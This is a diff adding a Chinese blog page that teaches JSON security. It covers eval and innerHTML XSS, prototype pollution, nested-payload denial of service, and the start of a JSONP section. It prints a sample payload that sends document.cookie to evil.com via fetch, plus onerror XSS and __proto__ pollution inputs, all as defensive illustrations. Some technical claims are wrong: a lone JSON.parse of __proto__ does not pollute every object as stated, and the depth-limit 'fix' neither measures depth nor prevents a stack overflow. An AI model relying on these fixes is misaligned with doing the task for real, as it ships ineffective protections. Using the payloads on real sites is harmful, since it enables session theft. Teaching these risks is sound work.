@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+<!-- Google Analytics -->
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-142124449-1', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<!-- End Google Analytics -->
+
+
+    
+
+    
+<!-- Baidu Tongji -->
+<script>var _hmt = _hmt || []</script>
+<script async src="//hm.baidu.com/hm.js?1c9123028e7e5abc8faae65d030b496e"></script>
+<!-- End Baidu Tongji -->
+
+
+
+
+    <meta charset="utf-8">
+    
+    <meta name="google-site-verification" content="HHaynQDbWoNBIm4JhtWmdzRe5CweKqUcxGjs3zqzRQU">
+    
+    
+    
+    
+    <title>JSON 安全性完全指南：XSS 攻击、原型污染与防护方案 | Javahiker&#39;s Homepage | 每天积累一点点！！！</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="JSON,JavaScript,安全,XSS,前端安全,后端安全">
+    <meta name="description" content="JSON 安全性完全指南：XSS 攻击、原型污染与防护方案 每个程序员都在用 JSON，但很少有人认真考虑 JSON 的安全问题。XSS 注入、原型污染、超大 payload 攻击……这些漏洞一旦被利用，后果可能是灾难性的。这篇文章帮你系统梳理 JSON 相关的安全风险和防护方案。   1. XSS 注入：eval() 是元凶问题最危险的写法——用 eval() 解析 JSON： 12&#x2F;&#x2F; ❌ 绝">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JSON 安全性完全指南：XSS 攻击、原型污染与防护方案">
+<meta property="og:url" content="http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/index.html">
+<meta property="og:site_name" content="Javahiker&#39;s Homepage">
+<meta property="og:description" content="JSON 安全性完全指南：XSS 攻击、原型污染与防护方案 每个程序员都在用 JSON，但很少有人认真考虑 JSON 的安全问题。XSS 注入、原型污染、超大 payload 攻击……这些漏洞一旦被利用，后果可能是灾难性的。这篇文章帮你系统梳理 JSON 相关的安全风险和防护方案。   1. XSS 注入：eval() 是元凶问题最危险的写法——用 eval() 解析 JSON： 12&#x2F;&#x2F; ❌ 绝">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-29T15:50:00.000Z">
+<meta property="article:modified_time" content="2026-07-29T15:31:42.961Z">
+<meta property="article:author" content="javahiker">
+<meta property="article:tag" content="JSON">
+<meta property="article:tag" content="JavaScript">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="前端安全">
+<meta property="article:tag" content="后端安全">
+<meta name="twitter:card" content="summary">
+    
+        <link rel="alternate" type="application/atom+xml" title="Javahiker&#39;s Homepage" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/logoliu.jpg">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brandliu.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/logoliu.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">javahiker</h5>
+          <a href="mailto:675435543@qq.com" title="675435543@qq.com" class="mail">675435543@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://github.com/javahikers" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">JSON 安全性完全指南：XSS 攻击、原型污染与防护方案</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">JSON 安全性完全指南：XSS 攻击、原型污染与防护方案</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2026-07-29T15:50:00.000Z" itemprop="datePublished" class="page-time">
+  2026-07-29
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%95%99%E7%A8%8B/">技术教程</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#JSON-%E5%AE%89%E5%85%A8%E6%80%A7%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97%EF%BC%9AXSS-%E6%94%BB%E5%87%BB%E3%80%81%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E4%B8%8E%E9%98%B2%E6%8A%A4%E6%96%B9%E6%A1%88"><span class="post-toc-number">1.</span> <span class="post-toc-text">JSON 安全性完全指南：XSS 攻击、原型污染与防护方案</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1-XSS-%E6%B3%A8%E5%85%A5%EF%BC%9Aeval-%E6%98%AF%E5%85%83%E5%87%B6"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">1. XSS 注入：eval() 是元凶</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%97%AE%E9%A2%98"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">问题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%AD%A3%E7%A1%AE%E5%81%9A%E6%B3%95"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">正确做法</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%B8%B2%E6%9F%93%E6%97%B6%E7%9A%84-XSS"><span class="post-toc-number">1.1.3.</span> <span class="post-toc-text">渲染时的 XSS</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%EF%BC%88Prototype-Pollution%EF%BC%89"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">2. 原型污染（Prototype Pollution）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%98%AF%E4%BB%80%E4%B9%88"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">是什么</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E6%A1%88"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">防护方案</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3-%E8%B6%85%E5%A4%A7-payload-%E6%94%BB%E5%87%BB%EF%BC%88DoS%EF%BC%89"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">3. 超大 payload 攻击（DoS）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%97%AE%E9%A2%98-1"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">问题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E6%A1%88-1"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">防护方案</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4-JSONP-%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">4. JSONP 的安全问题</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%97%AE%E9%A2%98-2"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">问题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%AD%A3%E7%A1%AE%E5%81%9A%E6%B3%95-1"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">正确做法</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-%E6%9C%8D%E5%8A%A1%E7%AB%AF-JSON-%E8%A7%A3%E6%9E%90%E7%9A%84%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">5. 服务端 JSON 解析的安全实践</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Node-js"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">Node.js</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Java%EF%BC%88Spring-Boot%EF%BC%89"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">Java（Spring Boot）</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%AE%89%E5%85%A8-checklist"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">安全 checklist</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-json-security-guide-xss-prototype-pollution"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">JSON 安全性完全指南：XSS 攻击、原型污染与防护方案</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2026-07-29 23:50:00" datetime="2026-07-29T15:50:00.000Z"  itemprop="datePublished">2026-07-29</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%95%99%E7%A8%8B/">技术教程</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="JSON-安全性完全指南：XSS-攻击、原型污染与防护方案"><a href="#JSON-安全性完全指南：XSS-攻击、原型污染与防护方案" class="headerlink" title="JSON 安全性完全指南：XSS 攻击、原型污染与防护方案"></a>JSON 安全性完全指南：XSS 攻击、原型污染与防护方案</h1><blockquote>
+<p>每个程序员都在用 JSON，但很少有人认真考虑 JSON 的安全问题。XSS 注入、原型污染、超大 payload 攻击……这些漏洞一旦被利用，后果可能是灾难性的。这篇文章帮你系统梳理 JSON 相关的安全风险和防护方案。</p>
+</blockquote>
+<hr>
+<h2 id="1-XSS-注入：eval-是元凶"><a href="#1-XSS-注入：eval-是元凶" class="headerlink" title="1. XSS 注入：eval() 是元凶"></a>1. XSS 注入：eval() 是元凶</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>最危险的写法——用 <code>eval()</code> 解析 JSON：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 绝对不要这样写</span></span><br><span class="line"><span class="keyword">const</span> data = <span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + userInput + <span class="string">&#x27;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如果用户输入的是：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>一切都好。但如果用户输入的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;: &quot;test&quot;&#125;); fetch(&#x27;https://evil.com/steal?cookie=&#x27; + document.cookie</span><br></pre></td></tr></table></figure>
+
+<p><code>eval</code> 会执行这段代码，用户的 cookie 就被偷走了。</p>
+<h3 id="正确做法"><a href="#正确做法" class="headerlink" title="正确做法"></a>正确做法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ✅ 正确：用 JSON.parse</span></span><br><span class="line"><span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(userInput)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 更安全：用 try-catch 包裹</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(userInput)</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;非法 JSON 输入&#x27;</span>, e)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="渲染时的-XSS"><a href="#渲染时的-XSS" class="headerlink" title="渲染时的 XSS"></a>渲染时的 XSS</h3><p>从 JSON 中取出数据直接渲染到页面上也可能出问题：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 危险！</span></span><br><span class="line">element.<span class="property">innerHTML</span> = <span class="string">`&lt;div&gt;<span class="subst">$&#123;data.username&#125;</span>&lt;/div&gt;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果 data.username 是 &quot;&lt;img src=x onerror=alert(&#x27;xss&#x27;)&gt;&quot;</span></span><br><span class="line"><span class="comment">// 脚本就会被执行</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>正确做法：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ✅ 方案 1：用 textContent（推荐）</span></span><br><span class="line">element.<span class="property">textContent</span> = data.<span class="property">username</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 方案 2：用 innerHTML 时一定要净化</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span></span><br><span class="line">element.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(data.<span class="property">content</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 方案 3：用 React/Vue，框架自带防护</span></span><br><span class="line"><span class="comment">// React &lt;div&gt;&#123;data.username&#125;&lt;/div&gt; — 默认转义</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>你可以用 <a target="_blank" rel="noopener" href="https://jsonprocess.app/json-validator">JSON 校验工具</a> 快速检查你的 JSON 是否包含非法字符。</p>
+</blockquote>
+<hr>
+<h2 id="2-原型污染（Prototype-Pollution）"><a href="#2-原型污染（Prototype-Pollution）" class="headerlink" title="2. 原型污染（Prototype Pollution）"></a>2. 原型污染（Prototype Pollution）</h2><h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p>JavaScript 中，对象会继承 <code>Object.prototype</code> 的属性。如果攻击者能修改原型对象，所有对象都会受到影响。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 恶意 JSON</span></span><br><span class="line"><span class="keyword">const</span> malicious = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: true&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 所有新建对象都继承了 isAdmin</span></span><br><span class="line"><span class="keyword">const</span> user = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">isAdmin</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>更隐蔽的攻击路径：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 递归合并对象的函数——这是最容易被攻击的场景</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> target[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        target[key] = source[key]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> userInput = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;polluted&quot;: true&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">merge</span>(config, userInput)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在所有对象都有了 polluted 属性</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">polluted</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h3><p><strong>方案 1：过滤 <code>__proto__</code> 和 <code>constructor</code> 键</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">safeMerge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!source.<span class="title function_">hasOwnProperty</span>(key)) <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ❗ 跳过危险 key</span></span><br><span class="line">    <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span> || key === <span class="string">&#x27;constructor&#x27;</span>) <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> target[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">      <span class="title function_">safeMerge</span>(target[key], source[key])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      target[key] = source[key]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>方案 2：使用 <code>Object.create(null)</code> 创建无原型的对象</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> safe = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)</span><br><span class="line">safe.<span class="property">name</span> = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="comment">// safe 没有 __proto__，不会被原型污染影响</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>方案 3：使用 <code>JSON.parse</code> 的 reviver 参数</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(userInput, <span class="function">(<span class="params">key, value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span> || key === <span class="string">&#x27;constructor&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> value</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>方案 4：用 Map 代替对象（ES6 推荐）</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Map 没有原型污染的困扰</span></span><br><span class="line"><span class="keyword">const</span> config = <span class="keyword">new</span> <span class="title class_">Map</span>(<span class="title class_">Object</span>.<span class="title function_">entries</span>(data))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)) <span class="comment">// 安全</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="3-超大-payload-攻击（DoS）"><a href="#3-超大-payload-攻击（DoS）" class="headerlink" title="3. 超大 payload 攻击（DoS）"></a>3. 超大 payload 攻击（DoS）</h2><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><p>攻击者发送一个巨大的 JSON 来耗尽服务器内存：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只有 28 字节，但 JSON.parse 后占用大量内存</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span><span class="number">3</span><span class="punctuation">,</span><span class="number">4</span><span class="punctuation">,</span><span class="number">5</span><span class="punctuation">,</span>...<span class="punctuation">]</span><span class="punctuation">&#125;</span>  <span class="comment">// 嵌套大量数据</span></span><br></pre></td></tr></table></figure>
+
+<p>更恶意的——**” Billion Laughs “ 的 JSON 版本**（利用数组&#x2F;对象嵌套）：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span>...<span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>深层嵌套的 JSON 会让 <code>JSON.parse</code> 栈溢出，导致程序崩溃。</p>
+<h3 id="防护方案-1"><a href="#防护方案-1" class="headerlink" title="防护方案"></a>防护方案</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 限制 JSON 大小</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeParse</span>(<span class="params">text, maxSize = <span class="number">1024</span> * <span class="number">1024</span></span>) &#123; <span class="comment">// 默认 1MB</span></span><br><span class="line">  <span class="keyword">if</span> (text.<span class="property">length</span> &gt; maxSize) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;JSON 太大，请检查输入&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 限制嵌套深度</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeParseWithDepth</span>(<span class="params">text, maxDepth = <span class="number">100</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> depth = <span class="number">0</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text, <span class="function">(<span class="params">key, value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> value === <span class="string">&#x27;object&#x27;</span> &amp;&amp; value !== <span class="literal">null</span>) &#123;</span><br><span class="line">      depth++</span><br><span class="line">      <span class="keyword">if</span> (depth &gt; maxDepth) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;JSON 嵌套太深，超过安全限制&#x27;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4-JSONP-的安全问题"><a href="#4-JSONP-的安全问题" class="headerlink" title="4. JSONP 的安全问题"></a>4. JSONP 的安全问题</h2><h3 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h3><p>JSONP（JSON with Padding）是一种跨域请求的旧方案，已经被 CORS 替代。但很多旧系统还在用：</p>
